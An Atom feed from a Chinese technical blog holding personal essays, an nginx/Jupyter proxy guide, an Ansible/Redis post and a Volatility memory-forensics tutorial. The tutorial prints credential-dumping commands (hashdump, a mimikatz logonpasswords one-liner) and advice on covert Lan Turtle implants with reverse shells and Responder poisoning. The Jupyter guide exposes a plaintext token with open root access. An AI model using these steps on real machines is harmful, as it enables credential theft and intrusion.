<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>PY.AI</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://iami.xyz/"/>
  <updated>2018-01-12T02:06:41.705Z</updated>
  <id>http://iami.xyz/</id>
  
  <author>
    <name>mour</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>死亡诗社与博尔赫斯口述</title>
    <link href="http://iami.xyz/2017/11/28/Life-me-up/"/>
    <id>http://iami.xyz/2017/11/28/Life-me-up/</id>
    <published>2017-11-27T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>书写和思考将人类与动物区分开来，也因此使我们变得不同。我们一边寄希望与未来，将文化和智慧传承下去。一边紧握当前，以求有所突破。数万年过来，人类文明得以发展。时光也仿佛就在史学家拿起笔写写画画的过程中逝去了，仿佛也就只能如此，但是事情并不是这样的，我们都知道，并不是这样。</p><p>不论是生物在进(退)化，还是宇宙在衰变。从原始人嘿哟嘿哟的喊叫开始，我们就被赋予了自由的权利。在遥远的过去，吟游诗人的嘴中还传唱神话故事的时候，人类就已经从那些统治着人类的超凡力量下解放出来。我告诉自己，一个人应该去追究幸福和自由，去探求真相(请不要纠结于到底是权利还是权力)，我也这样告诉身边的朋友，希望他们去感受美好，真真切切，快快乐乐。然而，人生在向前的过程中越来越具有鲜明的目的性。有时候，会愈发让人疑惑。是否坚持品质能够更好？每当我问自己这个问题，我都会告诉自己，是的，你应该保持美好的品质。</p><p>就像《凡人歌》所唱，你我皆凡人，生在人世间。然而，谁人不曾渴望放肆痛快去爱，活的痛快热烈呢？不曾渴望站在顶端放眼当世，看峰峦叠翠，跌宕起伏。然而大多人终将度过平凡的一生，穿梭于往来行人的街角巷尾。即便他们并不这么认为，却也无法改变这样的现实。这并不是说平凡不好，平凡，并没有什么不好。以前很多人嘲笑凤姐，拿她当做一个笑柄。凤姐说过，她花了人生中最美好的青春用于跨过这隐藏着于世间的沟壑。能坚持，极好。</p><p>所以你问我，人生的意义到底在哪里，或许就在那里。23岁的时候和喜欢的人做喜欢的事情。</p><h4 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h4><p>去年的12月1号，是我到上海工作的第一天。以后的博客可能会直接写在该博客github的<a href="https://github.com/mylamour/blog/issues" target="_blank" rel="noopener">issues</a>里了。工作看起来很忙，却又仿佛没有成果。一个瓶颈到另一个瓶颈罢了。</p><ul><li><a href="https://github.com/mylamour/blog/issues/8" target="_blank" rel="noopener">进击的安全</a> </li><li><a href="https://github.com/mylamour/blog/issues/5" target="_blank" rel="noopener">机器学习从头开始之基础套路</a></li><li><a href="https://github.com/mylamour/blog/issues/3" target="_blank" rel="noopener">翻了翻工作日志，写个总结吧</a></li></ul><h4 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h4><p>前言来自琐琐碎碎读过的书和记不清的内容</p><ul><li>《神话与诗》</li><li>《博尔赫斯：口述》</li><li>《伊利亚特》</li><li>《死亡诗社》</li><li>《凡人歌》</li></ul><p>后记来自工作和学习,知识的积累需要时间，慢慢沉淀方可。能否如尝我愿，尚未可知。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h4&gt;&lt;p&gt;书写和思考将人类与动物区分开来，也因此使我们变得不同。我们一边寄希望与未来，将文化和智慧传承下去。一边紧握当前，以求有所突破。数万年
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="漫漫人生路" scheme="http://iami.xyz/tags/%E6%BC%AB%E6%BC%AB%E4%BA%BA%E7%94%9F%E8%B7%AF/"/>
    
  </entry>
  
  <entry>
    <title>第一次机器学习培训总结</title>
    <link href="http://iami.xyz/2017/09/14/Machine-learning-training-for-nothing/"/>
    <id>http://iami.xyz/2017/09/14/Machine-learning-training-for-nothing/</id>
    <published>2017-09-13T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>本文<a href="/assets/ml_training.pptx">无干货</a>，吐槽加扯淡。</p><p>到公司后开始组织技术分享也有一段时间了。本着好意，本着分享，想去提高大家的水平。于是呢，就在上周四，我去给公司一干同事讲了一节课机器学习。题目是上上周四定的，准备了4，5天希望能够尽可能的通俗的基础的去引起他们的兴趣，希望带他们入门。然而事情怎么可能像想象的那么样顺利呢？然后我才明白了任何看起来正常的事情背后需要付出多大的努力。</p><p>在之前的公司里，搞搞技术分享很正常，大家也很乐意，会在一定时间内集中精神讲完，都很上进。在这里，一万个不乐意，玩手机的玩手机，假寐的假寐，<br>真是操蛋。</p><h4 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h4><p><strong>[消耗]</strong>：<br>5天，完整2天时间，3天每天3小时以上。</p><blockquote><p>两个数据集:</p></blockquote><ul><li>Mnist </li><li>SMS  </li></ul><blockquote><p>三种算法:</p></blockquote><ul><li>KNN</li><li>SVM</li><li>Naive Bayes</li></ul><blockquote><p>两种实现:</p></blockquote><ul><li>Scikit-Learn</li><li>Tensorflow</li></ul><blockquote><p>其他</p></blockquote><ul><li>注册了一个域名</li><li>部署了聊天室作为课前后讨论</li><li>部署了Jupyter给他们用，运行在线示例</li><li>打印资料，提前4天提供。</li></ul><p>我准备的是两个示例，<code>mnist</code>手写数据集识别和<code>SMS</code>垃圾文本分类。用的算法也是最简单的，<code>KNN/SVM</code>(Mnist),NaiveBayes(SMS text),分别实现了<code>tensorflow</code>版本和<code>scikit-learn</code>两个版本。主要讲的两个算法是<code>KNN</code>和<code>Bayes</code>。</p><p><strong>[收获]</strong>：<br>&gt;</p><ul><li>加深了对这些概念和算法的掌握，说明和别人讲东西，的确会提高自己的认知。</li><li>应该得罪了几个人，不过我根本不在乎。如果认知在一个层次的话，就不会这样了。</li><li>做了大学到现在最长的一次PPT，知道自己很傻逼很浅</li><li>要成大事，还需要努力努力再努力</li></ul><h4 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h4><p>后来，讲完之后，大家还讨论了一下这个技术分享的事情。最后呢。</p><ul><li><p>见贤思齐焉，见不贤而内自省也。</p><blockquote><p>你心里就没有B数吗？都不能上进些？</p></blockquote></li><li><p>大家的水平真是参差不齐(一同事说考虑到这多同事的水平)</p><blockquote><p>我不是讽刺谁，在座的水平都是垃圾。</p><blockquote><p>要是吹牛逼有用，那你们的水平真是比我高多了。</p></blockquote></blockquote></li></ul><p>PS：突然发现上面有歧义，以上的一级引用意指这句话可不可这以理解？顺便加上逗比的文字表情包。并没有讽刺谁。为了讽刺谁就没有意义了。只是为了自省。(update 09.20)</p><ul><li><p>第二天早上老板说，这效果不好，感觉大家没入门。</p><blockquote><p>难道要我喂不成，什么都不看，分享时也不听。能入P的门，何况这本身也不是你一节课就能入得门。我自己学了那么久，也没敢说自己入门。</p><blockquote><p>我把PPT丢给学弟，学弟都能感到这是在是一个入门级别的东西。所以，是我讲的不够简单，还是学弟太聪明？<br>前两次扯一个异常与错误处理都能吹2个半小时牛逼，扯到天南地北的。</p></blockquote></blockquote></li><li><p>我实在不明白为什么有的人什么都不会又tm不想提高自己，不愿意接触不会的知识。</p><blockquote><p>想有什么用(海知时杨老师给我讲的，鉴于杨老师的特质，时刻提醒自己)</p></blockquote></li></ul><p><img src="/images//caodandefenxiang.png" alt="img"></p><ul><li>现在看来我们实验室出来的，水平都还是可以的，</li></ul><p>敬，自由。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h4&gt;&lt;p&gt;本文&lt;a href=&quot;/assets/ml_training.pptx&quot;&gt;无干货&lt;/a&gt;，吐槽加扯淡。&lt;/p&gt;
&lt;p&gt;到公司后开始组
      
    
    </summary>
    
      <category term="学习数据挖掘的路上" scheme="http://iami.xyz/categories/%E5%AD%A6%E4%B9%A0%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E7%9A%84%E8%B7%AF%E4%B8%8A/"/>
    
    
      <category term="学习笔记" scheme="http://iami.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="机器学习" scheme="http://iami.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Nginx SubDomain and Proxypass Jupyter notebook</title>
    <link href="http://iami.xyz/2017/09/10/nginx-subdomain-and-proxy-jupyter/"/>
    <id>http://iami.xyz/2017/09/10/nginx-subdomain-and-proxy-jupyter/</id>
    <published>2017-09-09T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<p>It was being executed it in my DigitOcean Machine Learning AI Droplet.</p><p>Firstly, Parser a domain name to your vps, (add A record, also your subdomain). Now we edit the config file in our configure file. locate at in <code>/etc/nginx/conf.d/yourselfdomain.conf</code></p><p>for example , in my subdomain, i edit the file <code>/etc/nginx/conf.d/mldl.conf</code>, and change it to:</p><blockquote></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name irc.mldl.site;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://localhost:3000;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Note:Jupyter token was being writted in <code>~/.bashrc</code>, and was runing as service(also allow root acces),if your want stop it, and run it on yourself directory.Just follow the step:</p><p>step 1:</p><blockquote><p><code>systemctl stop jupyter.service</code></p></blockquote><p>step 2:</p><blockquote><p><code>jupyter-notebook --NotebookApp.token=2bab1e75-22c8-4328-b791-83a39a7170a7 --no-browser --port 8080 --ip=0.0.0.0</code></p><p>if you need to allow root access,</p><p><code>jupyter-notebook --NotebookApp.token=2bab1e75-22c8-4328-b791-83a39a7170a7 --no-browser --port 8080 --ip=0.0.0.0 --allow-root</code></p></blockquote><p>But there was a problem, Jupyter use the ajax as a response. Nginx use proxy head to solve the cross domain problem. Now, the new configure file looke like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name jupyter.mldl.site;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://localhost:8080;</span><br><span class="line">        add_header Access-Control-Allow-Origin: *;</span><br><span class="line">        proxy_set_header X-Real_IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-NginX-Proxy true;</span><br><span class="line">        proxy_ssl_session_reuse off;</span><br><span class="line">        proxy_set_header Host $http_host;</span><br><span class="line"></span><br><span class="line">        proxy_redirect off;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;It was being executed it in my DigitOcean Machine Learning AI Droplet.&lt;/p&gt;
&lt;p&gt;Firstly, Parser a domain name to your vps, (add A record, a
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="小手段" scheme="http://iami.xyz/tags/%E5%B0%8F%E6%89%8B%E6%AE%B5/"/>
    
  </entry>
  
  <entry>
    <title>内存取证,密码提取以及Volatility的使用</title>
    <link href="http://iami.xyz/2017/08/25/Volatility-Memory-Analysis/"/>
    <id>http://iami.xyz/2017/08/25/Volatility-Memory-Analysis/</id>
    <published>2017-08-24T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言-简介"><a href="#前言-简介" class="headerlink" title="前言 : 简介"></a>前言 : 简介</h4><p>这个月开始使用<code>Volatility</code>进行内存取证，以及密码提取相关。还顺带玩了把 <code>Lan Turtle</code>以及<code>Leonarde</code>。 <code>Leonarde</code>只是用来模拟键盘，算是比较限制吧。<code>Lan Turtle</code>则功能十分强大。</p><p><code>Volatility</code>可谓享有盛名，在我使用的过程中，越发佩服作者。厉害了。</p><h4 id="Step-1-获取内存镜像"><a href="#Step-1-获取内存镜像" class="headerlink" title="Step 1 : 获取内存镜像"></a>Step 1 : 获取内存镜像</h4><p>要想对镜像进行分析，首先肯定是要获取到内存镜像</p><ul><li>windows </li></ul><blockquote><p>非常简单,直接使用<a href="https://github.com/mylamour/-_--Forensics-Tools/raw/master/utils/DumpIt.exe" target="_blank" rel="noopener">dumpit.exe</a>即可,对远程的话可以采用<code>F-Response</code>. <code>Windows</code>下其实有很多的工具可以进行内存镜像。这里就不一一介绍了。</p></blockquote><ul><li>linux<blockquote><p>稍微复杂一点需要使用到<code>LIME</code>,之前还可以用<code>dd</code>,但是现在<code>linux</code>不允许<code>dd</code>读取超过<code>1M</code>的空间。</p></blockquote></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/limetext/lime</span><br><span class="line">$ <span class="built_in">cd</span> src</span><br><span class="line">$ make</span><br><span class="line">....</span><br><span class="line">  CC [M]  /home/mhl/Downloads/src/tcp.o</span><br><span class="line">  CC [M]  /home/mhl/Downloads/src/disk.o</span><br><span class="line">....</span><br><span class="line">$ sudo insmod lime-4.10.0-30-generic.ko <span class="string">"path=/home/mour/ubuntu_test1704.lime format=lime"</span></span><br></pre></td></tr></table></figure><h4 id="Step-2-分析的前提条件，要有个profile"><a href="#Step-2-分析的前提条件，要有个profile" class="headerlink" title="Step 2 : 分析的前提条件，要有个profile"></a>Step 2 : 分析的前提条件，要有个<code>profile</code></h4><p>得到内存镜像之后，可以准备进行分析了。而进行分析的前提的条件是根据<code>profile</code>文件。<code>profile</code>文件其实就是将内存映射文件和调试信息压缩放在一起，由<code>volatility</code>然后框架进行读取。<code>Windows</code>和<code>Linux</code>有一点不一样，就是<code>Windows</code>下的<code>profile</code>的可以迁移使用，所以有时候也会建议好几种版本。但是<code>Linux</code>下的则不一样，必须是要求：</p><ul><li>CPU架构一致</li><li>内核版本一致</li><li>发行版本一致</li></ul><p>官网给出的<a href="https://github.com/volatilityfoundation/volatility/wiki/Linux" target="_blank" rel="noopener">制作教程</a>在这里，但是已经有些不适用了。目前已经有更加方便的方法了。</p><ol><li>查看内核版本，安装下相应的<code>Header</code>文件</li></ol><blockquote><p><img src="/images//volatility/0814jietu2.png" alt="image"> </p></blockquote><ol><li>制作<code>dwarf</code>文件</li></ol><blockquote><p>这一步在原始教程里十分的繁复，其实新版本的<code>volatility</code>早已经写好了一个<code>makefile</code>脚本进行整个套路。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> volatility/tools/linux</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><ol><li>合并<code>System Map</code>文件和<code>dwarf</code>文件</li></ol><p><img src="/images//volatility/0814jietu1.png" alt="image"></p><ol><li>将<code>profile</code>放置在对应的文件夹下<code>volatility/volatility/plugins/overlays/</code>,但是记住，千万不要一次性加载<code>profile</code>文件，需要什么加载什么。因为<code>volatility</code>会加载所有插件，所以导致十分慢。</li></ol><h4 id="Step-3-自古深情留不住-总是套路得人心"><a href="#Step-3-自古深情留不住-总是套路得人心" class="headerlink" title="Step 3 : 自古深情留不住,总是套路得人心"></a>Step 3 : 自古深情留不住,总是套路得人心</h4><p>常规套路:扫描得到内存镜像信息(已经知道就不需要了，可以直接指定<code>profile</code>了)。</p><p>然后使用对应的<code>profile</code>进行分析。还可以加载不同的插件进行相应的分析。</p><ul><li>查看支持的Profile</li></ul><blockquote><p><code>python vol.py --info | grep Linux</code></p></blockquote><p>可以将自制的<code>profile</code>放置在<code>volatility/plugins/overlays/</code>下面，然后使用命令查看<code>profile</code>名称并进行使用</p><p>1.Windows 平台</p><ul><li>Dump 内存中的所有dll, 到本机</li></ul><blockquote><p><code>python vol.py -f win7.vmem --profile=Win7SP1x64 dlldump -D dlls/</code></p></blockquote><ul><li>查看Windows的进程</li></ul><blockquote><p><code>python vol.py -f win7.vmem --profile=Win7SP1x64 pslist</code></p></blockquote><ul><li>查看所有的网络通信</li></ul><blockquote><p><code>python vol.py -f win7.vmem --profile=Win7SP1x64 netscan</code></p></blockquote><ul><li>查看所有的句柄</li></ul><blockquote><p><code>python vol.py -f win7.vmem --profile=Win7SP1x64 handles</code></p></blockquote><ul><li>查看命令行历史</li><li>查看注册表，等等等等</li></ul><p>其实我们从<code>wiki</code>里就可以看到，volatility支持的操作，主要感兴趣的在(以下为<code>windows</code>下)</p><ul><li>Image Identification</li><li>Processes and DLLs</li><li>Process Memory</li><li>Kernel Memory and Objects</li><li>Networking</li><li>Registry</li><li>Crash Dumps, Hibernation, and Conversion</li><li>File System</li><li>Miscellaneous</li></ul><p>一个个列举也没什么意思，还有就是<code>Volshell</code>比较有用，当然配合<code>yara</code>还可以检查内存是否存在病毒。</p><p><code>volshell</code>可以对内存镜像进行交互式的操作，命令行能干的<br>shell里都能够干。<a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#volshell" target="_blank" rel="noopener">原文</a>照抄一下：</p><ul><li>List processes</li><li>Switch into a process’s context</li><li>Display types of structures/objects</li><li>Overlay a type over a given address</li><li>Walk linked lists</li><li>Disassemble code at a given address</li></ul><h4 id="Step-4-提取密码和一些好玩的套路"><a href="#Step-4-提取密码和一些好玩的套路" class="headerlink" title="Step 4 : 提取密码和一些好玩的套路"></a>Step 4 : 提取密码和一些好玩的套路</h4><p>提取系统密码，是最基本的啦，Windows的登录密码加密方式有<code>NTLMV1</code>和<code>NTLMv2</code>。<code>Windows 7</code>及以前的是<code>NTLMV1</code>实现的，<code>python</code>中可以利用这样的代码生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,binascii</span><br><span class="line">hash = hashlib.new(<span class="string">'md4'</span>, <span class="string">"sad"</span>.encode(<span class="string">'utf-16le'</span>)).digest()</span><br><span class="line"><span class="keyword">print</span> (binascii.hexlify(hash))</span><br></pre></td></tr></table></figure><p>提取方式:<br><code>$ python -f xxxx.vmem --profile=Win7SP1x64 hashdump</code><br>之前文档里面一直提到需要首先找到基地址，然后找到偏移地址才可以进行。实践发现并不需要。</p><p>当然在有管理员权限的情况下，可以直接使用<code>mimikatz</code>(<code>windows</code>)提取。即可以交互进行，也可以一行命令行提取(这个是使用了<code>log</code>选项)。<br><code>mimikatz logs &quot;privilege::debug&quot;;sekurlsa::logonpasswords</code> 想想使用<code>Leonarde</code>加在一起是不是猥琐的不行，不过<code>leonarde</code>模拟虚拟键盘也有一大堆的问题。我是参考的<a href="http://www.freebuf.com/sectool/107242.html" target="_blank" rel="noopener">这篇文章</a>,对我来说还好吧，改了改代码能用。不知道为什么评论区有那么多问题。不过确实不少问题，还好都解决掉了。</p><p>提取浏览器密码:</p><blockquote><p>得到浏览器进程，使用<code>vad</code>插件<code>dump</code>出整个进程空间，然后分析<code>grep</code>搜索关键字。</p></blockquote><p>其实最简单的就是使用<code>WinHex</code>直接搜索内存镜像，使用<code>grep</code>也一样。</p><p>过锁屏提取密码:</p><p>使用<code>Lan turtle</code>,这个是真邪恶，同时还可以用来过锁屏，利用的是<code>Responder</code>认证机制漏洞。不过呢,利用条件也很苛刻，起码在win7上，不能有选择网络位置，否则不行。只有无线的话，插上去也不行。但是<code>hak5</code>上演示的时候有的是可以的。<br>这个我觉得<code>Lan Turtle</code>的好处就是隐藏自己，探视内网。我不建议直接启用<code>Quick Cred</code>,应该只反向一个<code>ssh</code>或者<code>meterpreter</code>,然后再去启用<code>Reponder</code>    去投毒。<br>避免被发现。挑一个时间去执行。当然这个对<code>linux</code>没有用。我也只在一台<code>win10</code>上测试成功了。</p><h4 id="Step-5-病毒分析与重建二进制"><a href="#Step-5-病毒分析与重建二进制" class="headerlink" title="Step 5 : 病毒分析与重建二进制"></a>Step 5 : 病毒分析与重建二进制</h4><p>VAD(Virtual Address Descriptor)是内存取证中的重要参考。</p><ul><li><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Mal" target="_blank" rel="noopener">病毒分析</a>:</li></ul><ol><li>命令行配合<code>yara</code>去扫描规则</li><li>主要进程分析，多余dll分析，以及其他。进程注入分析，网络行为，等等吧。手动。。。。还可以绘制出<code>vadmap</code>的图，可以用<code>graphviz</code>打开的。</li></ol><ul><li>创建二进制<br>其实不应该单独拿出来了讲，听着名字很牛逼的感觉，其实就是抽取进程，和前面的一样的。使用<code>vaddump</code></li></ul><h4 id="Not-FAQ"><a href="#Not-FAQ" class="headerlink" title="Not FAQ"></a>Not FAQ</h4><ul><li>内存镜像时会捕捉到宿主机的整个镜像，如果宿主机中有虚拟机正在运行，同样也会被捕捉到。现实中也常常是这样，那么此时应该怎么办?</li></ul><blockquote><p>可以先解压出<code>vmware</code>进程的地址空间，然后再去用对应<code>profile</code>分析对应的<code>Vmware</code>内的操作系统。</p></blockquote><p><img src="/images//volatility/0817jietu.png" alt="image"></p><ul><li><code>Linux Kernel 4.8</code>以上的内核采用了随机内存地址，此时该怎么办？</li></ul><p><img src="/images//volatility/0818jietu.png" alt="image"></p><ul><li><p>文件分散存储在磁盘上，运行时读取到一段连续的内存中。但是<code>PE</code>文件是由操作系统读取到内存中，所以内存映射稍有不同，具体哪里不同，我也没看到资料。</p></li><li><p><code>raw</code> 与 <code>dmp</code> 与 <code>vmem</code></p></li><li><p>注意看一下，<code>profile</code>压缩包里面是否需要有目录结构。我之前没有加也可以用，但是自带的<code>profile</code>里有的。</p></li><li><p><code>powershell.exe -command start-process powershell -verb runAs</code></p></li><li><p><code>Rekall</code>也是很不错的内存取证框架。</p></li></ul><h4 id="Conclusion："><a href="#Conclusion：" class="headerlink" title="Conclusion："></a>Conclusion：</h4><ul><li><a href="https://github.com/iAbadia/Volatility-Plugin-Tutorial" target="_blank" rel="noopener">如何编写<code>volatility</code>插件</a></li></ul><p>今天试用期结束，又要开始新的项目了<code>windows木马检测</code>。逐渐发现了公司的一些问题。公司比较缺乏技术交流的氛围。自己便和另外一个同事组织了一下搞起了这个。这其实从另一个方向说明了越是那些正常的，越是难以实现。必须是经历过许多的坎坷(或者不需要)才能建立出一个给人感觉自然的，方便的，正常的。自己以前一直觉得很正常的东西，推行起来还是有问题的。<br>唉，东西一段时间不用就会忘掉。其他几门语言忘掉了许多了。</p><p>公司里面有个大神每周来着分享，据说有20年互联网的经验，是老板请的贵客。之前还在启明星辰带过团队，履历挺牛逼的，大家也都觉得很牛逼的。我也觉得他<code>C++</code>和<code>Python</code>很牛逼。盛名之下，其实难副。也是一言难尽吧。人倒还是不错。</p><h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h4><ul><li><a href="https://github.com/504ensicsLabs/LiME" target="_blank" rel="noopener">LIME</a></li><li><a href="https://www.f-response.com/software/ee" target="_blank" rel="noopener">F-Response</a></li><li><a href="https://github.com/volatilityfoundation/volatility/wiki/" target="_blank" rel="noopener">Volatility Wiki</a></li><li><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Mal" target="_blank" rel="noopener">Volatility Malware Find</a></li><li><a href="http://www.hackingarticles.in/volatility-an-advanced-memory-forensics-framework/" target="_blank" rel="noopener">volatility simple tutorial</a></li><li><a href="https://github.com/volatilityfoundation/volatility/wiki/Linux#creating-a-new-profile" target="_blank" rel="noopener">Creating a profile</a></li><li><a href="">PEB</a></li><li><a href="http://lilxam.tuxfamily.org/blog/?p=326&amp;lang=en" target="_blank" rel="noopener">VAD: Understanding Virtual Address Descriptors</a></li><li><a href="https://msdn.microsoft.com/en-us/library/ms810627.aspx" target="_blank" rel="noopener">Managing Virtual Memory</a></li><li><a href="http://project-rainbowcrack.com/" target="_blank" rel="noopener">rainbow crack</a></li><li><a href="https://bneuburg.github.io/volatility/kaslr/2017/04/26/KASLR1.html" target="_blank" rel="noopener">Kernel Address Space Randomization in Linux or how I made Volatility bruteforce the page tables</a></li><li><a href="http://wiki.dwarfstd.org/index.php?title=Libdwarf_And_Dwarfdump#What_is_dwarfdump" target="_blank" rel="noopener">What is dwarfdump</a></li><li><a href="https://lanturtle.com/" target="_blank" rel="noopener">LAN Turtle</a></li><li><a href="https://github.com/mylamour/-_--Forensics-Tools/" target="_blank" rel="noopener">-_–Forensics-Tools</a></li><li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a></li><li><a href="http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html" target="_blank" rel="noopener">mimikatz取虚拟机内存镜像</a></li><li><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">Responder</a></li><li><a href="https://room362.com/post/2016/snagging-creds-from-locked-machines/" target="_blank" rel="noopener">snagging-creds-from-locked-machines</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言-简介&quot;&gt;&lt;a href=&quot;#前言-简介&quot; class=&quot;headerlink&quot; title=&quot;前言 : 简介&quot;&gt;&lt;/a&gt;前言 : 简介&lt;/h4&gt;&lt;p&gt;这个月开始使用&lt;code&gt;Volatility&lt;/code&gt;进行内存取证，以及密码提取相关。还顺带玩了把 &lt;
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="学习笔记" scheme="http://iami.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Ansible与Redis集群的搭建</title>
    <link href="http://iami.xyz/2017/08/19/Ansible-And-Redis-Cluster/"/>
    <id>http://iami.xyz/2017/08/19/Ansible-And-Redis-Cluster/</id>
    <published>2017-08-18T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言-就是废话啦"><a href="#前言-就是废话啦" class="headerlink" title="前言 : 就是废话啦"></a>前言 : 就是废话啦</h4><p>之前为了给vultr写一篇文档<code>how to build a redis cluster in vulter</code>，后来由于语法问题没有通过，就搁置了。也没有翻译回来贴在自己的博客上。所以还是收拾一下吧。其实只是为了搭建<code>pyspider</code>分布式的。</p><h4 id="正文-什么是什么东西"><a href="#正文-什么是什么东西" class="headerlink" title="正文 : 什么是什么东西"></a>正文 : 什么是什么东西</h4><p>用<code>ansible</code>，是latern哥推荐的，我呢是从<code>vagrant</code>过度过来的。他们都是基于<code>ssh</code>的。安装很简单<code>pip install ansible</code>就行了。<br><code>redis</code> 用过吧，缓存队列是最常用的功能。</p><ol><li>创建一个单独的<code>ansible</code>用户，但是记住，要在创建用户的同时创建主目录，负责就很蛋疼了。当时试了很久不行，权限拒绝，后来才发现我添加用户的时候没有创建主目录，因此导致了不能用。主机这一块暂时不讲了，使用<code>ssh</code>秘钥去创建批量机器，或者以一个为模板机器去创建。</li></ol><p>2.当你去连接slave节点时，由于需要ansible的密码，在第一次的时候，会要求验证ssh 指纹，方便起见，可以来一个<code>playbook</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env ansible-playbook</span><br><span class="line">---</span><br><span class="line">- name: accept ssh fingerprint automatically for the first time</span><br><span class="line">  hosts: all</span><br><span class="line">  connection: local</span><br><span class="line">  gather_facts: False</span><br><span class="line"></span><br><span class="line">  tasks:</span><br><span class="line">    - name: &quot;check if known_hosts contains server&apos;s fingerprint&quot;</span><br><span class="line">      command: 